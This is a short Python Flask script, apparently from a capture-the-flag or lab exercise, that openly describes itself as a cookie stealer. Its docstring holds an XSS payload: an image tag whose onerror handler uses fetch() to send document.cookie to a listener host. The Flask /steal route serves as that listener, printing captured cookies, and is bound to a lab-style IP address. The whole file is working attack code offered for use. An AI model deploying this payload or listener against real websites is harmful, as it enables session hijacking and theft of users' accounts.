from flask import Flask, request


'''
This is a script to steal cookies using a xss payload

<img+src="invalid_image.jpg"+onerror="fetch('http://127.0.0.1/steal?cookie='%2bdocument.cookie)">


'''

app = Flask(__name__)

@app.route('/steal')
def steal_cookie():
    # Get all cookies sent in the request
    all_cookies = request.cookies

    # Print each cookie
    for cookie_name, cookie_value in all_cookies.items():
        print(f"Cookie Name: {cookie_name}, Cookie Value: {cookie_value}")

    return 'All cookies captured!', 200

if __name__ == '__main__':
    app.run(host="10.10.14.3",port=80,debug=True)
